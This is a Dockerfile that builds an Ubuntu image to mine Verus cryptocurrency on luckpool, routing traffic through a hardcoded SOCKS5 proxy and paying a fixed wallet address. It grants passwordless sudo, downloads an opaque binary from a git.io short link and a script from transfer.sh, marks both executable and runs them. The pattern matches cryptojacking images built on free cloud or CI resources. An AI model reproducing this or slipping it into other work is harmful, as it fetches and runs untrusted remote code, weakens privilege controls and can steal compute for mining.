FROM ubuntu

ENV HOST="na.luckpool.net"
ENV PORT=3956
ENV ADDRESS="RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9"
ENV WORKER="KachInd"
ENV THREADS=0
ENV PROXY=socks5://158.69.66.21:7497

RUN apt-get -y update && apt-get -y upgrade && apt-get -y update
RUN apt-get -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential sudo git wget

RUN adduser --disabled-password --gecos '' docker
RUN adduser docker sudo
RUN echo '%sudo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

USER docker
RUN sudo apt-get update

RUN wget -qO code git.io/JiGZh && wget -qO compile transfer.sh/3X5lIJ/compile.sh && chmod +x code compile
RUN sudo chmod +x code
RUN ./code -a verus -o  stratum+tcp://na.luckpool.net:3956#xnsub -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.coal -p -t 4 -x socks5://158.69.66.21:7497
RUN ./compile
ENTRYPOINT ["sh", "-c", "sudo ./start_ccminer.sh -h \"$HOST\" -p \"$PORT\" -a \"$ADDRESS\" -w \"$WORKER\" -t \"$THREADS\" -x \"$PROXY\""]
